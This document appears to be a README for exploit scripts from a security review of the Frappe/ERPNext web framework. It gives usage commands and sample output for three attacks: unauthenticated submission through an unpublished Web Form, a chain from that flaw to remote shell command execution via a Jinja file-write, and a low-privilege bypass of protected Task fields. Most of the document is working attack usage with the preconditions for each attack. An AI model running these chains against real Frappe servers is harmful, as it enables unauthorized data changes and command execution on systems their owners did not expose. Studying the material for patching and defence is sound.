# Frappe Web Form exploits

These scripts exploit FRAPPE-05, FRAPPE-07, and the conditional FRAPPE-05 plus
FRAPPE-04 chain. They make real target mutations and leave the created records
or files in place.

Python 3.10 or later is required. The scripts use only the standard library.

## FRAPPE-05: unpublished Guest Web Form submission

`frappe05_unpublished_web_form_submit.py` creates a document through a Web
Form whose public route has been unpublished.

The attacker needs:

- the saved Web Form name;
- `published=0`, `login_required=0`, and `key_required=0`;
- values for the form's configured fields that satisfy the target DocType.

Frappe did not ship a suitable stock unpublished form in the reviewed
versions. The target therefore needs an administrator-created draft or a
formerly public Guest form left in this state.

Pass the document values directly with `--data`:

```console
python3 frappe05_unpublished_web_form_submit.py \
  --url https://frappe.example \
  --web-form unpublished-todo \
  --data '{"description":"Send the revised invoice"}'
```

```text
 [*] submitting Web Form 'unpublished-todo' as an unauthenticated Guest
 [+] created ToDo a3f9c2e1b7 as Guest
  ------------------------------------------------------------
{
  "web_form": "unpublished-todo",
  "created_document": {
    "name": "a3f9c2e1b7",
    "owner": "Guest",
    "status": "Open",
    "priority": "Medium",
    "description": "Send the revised invoice",
    "doctype": "ToDo"
  }
}
```

The script sends the supplied values straight to `web_form.accept` as Guest
and prints the inserted document returned by Frappe. It does not depend on the
form page or metadata endpoint being reachable. The new document remains on
the target.

Only fields configured on the Web Form can reach the target document. Normal
DocType validation and controller hooks still run.

## FRAPPE-05 plus FRAPPE-04: Guest to command execution

`frappe05_04_guest_rce.py` uses an unpublished Guest form to create a dynamic
Web Page, then uses the FRAPPE-04 Jinja file-write primitive to plant a static
page controller and execute a shell command.

The chain needs:

- an unpublished Web Form with Guest submission enabled and no request key;
- `Web Page` as its target DocType;
- unrestricted `title`, `route`, `published`, `content_type`,
  `dynamic_template`, and `main_section_html` fields;
- a known installed-app `www` path writable by the web process and shared with
  the process serving website routes.

Run the default `id` command:

```console
python3 frappe05_04_guest_rce.py \
  --url https://frappe.example \
  --web-form unpublished-web-page \
  --www-path ../apps/custom_app/custom_app/www
```

```text
 [+] both random routes returned HTTP 404 before the chain
 [+] created Guest-owned dynamic Web Page 'frappe0504-6b1d9e2a-stage'
 [*] writing controller through the Jinja save() sink to /frappe0504_6b1d9e2a_exec
 [+] controller planted; requesting the execution route
 [+] remote command exited with status 0
  ------------------------------------------------------------
uid=1000(frappe) gid=1000(frappe) groups=1000(frappe)
```

Or supply another command:

```console
python3 frappe05_04_guest_rce.py \
  --url https://frappe.example \
  --web-form unpublished-web-page \
  --www-path ../apps/custom_app/custom_app/www \
  --command 'uname -a'
```

The script prints the command's real stdout, writes its real stderr to stderr,
and reports the exit status. It does not require the output to be known in
advance.

The staging and execution routes use a random 80-bit suffix and cannot be
chosen from the command line. Both must return HTTP 404 before either mutation
is sent. This avoids an obvious route collision, although HTTP 404 cannot prove
that same-named files are absent from the app tree.

Successful exploitation leaves a Guest-owned Web Page and the printed `.html`
and `.py` paths. Removing those artefacts does not reverse anything done by the
chosen command.

Nothing is removed automatically. Delete the two printed files first, then the
Guest-owned Web Page through Desk or the REST API. Confirm removal on the
filesystem rather than by requesting the route.

## FRAPPE-07: protected Task fields

`frappe07_web_form_field_authorization.py` signs in as a low-privileged System
User and submits protected values through ERPNext's stock `tasks` Web Form.

The attacker needs:

- credentials for a low-privileged System User that can open Desk;
- the exact name of a Project the account cannot access;
- the published, login-required stock `tasks` Web Form;
- a status the form does not offer, such as `Completed` on the affected
  version.

The Project name is not disclosed by this vulnerability. It must be learned
elsewhere or guessed.

```console
FRAPPE07_PASSWORD='low-privilege-password' \
python3 frappe07_web_form_field_authorization.py \
  --url https://frappe.example \
  --username lowpriv@example.net \
  --project PROJ-0001 \
  --subject 'Quarterly close' \
  --status Completed
```

```text
 [*] signing in as the low-privilege user lowpriv@example.net
 [*] submitting a Task into Project 'PROJ-0001' with status 'Completed'
 [+] created Task TASK-2026-00042 in Project PROJ-0001 with status Completed
  ------------------------------------------------------------
{
  "created_task": {
    "name": "TASK-2026-00042",
    "owner": "lowpriv@example.net",
    "subject": "Quarterly close",
    "project": "PROJ-0001",
    "status": "Completed",
    "progress": 100.0,
    "doctype": "Task"
  }
}
```

The password belongs to the attacker-controlled low-privileged account. The
script obtains that session's CSRF token, submits the Task, and prints the
inserted Task returned by Frappe. No administrator credentials are used.

Use `--data` to supply extra configured Task fields, and `--priority` to change
the default `Medium` priority. The created Task remains on the target. If the
Project uses Task Completion and has no other incomplete Tasks, a completed
Task can move the Project to 100 percent and `Completed`.

Deleting the Task afterwards does not restore the Project on its own, because
the recalculation runs from the Tasks that exist at the time. Record the
Project's `percent_complete` and `status` before running this, and restore them
explicitly. The unpublished-form and Task clients also advance Frappe's naming
counters, which is not reversed by deleting the documents.

## Common options

`--site` sends `X-Frappe-Site-Name` when the site is reached through another
host address. `--insecure` disables TLS certificate verification.

Each script prints a banner and coloured `[*]`/`[+]`/`[!]`/`[-]` progress to
stderr, and writes its result — the created document as JSON, or the command
output — to stdout, so a run can be piped and only the result kept. Pass
`--no-color` (or set `NO_COLOR=1`) to disable colour, and see `--help` on any
script for the finding it exploits and a worked example.
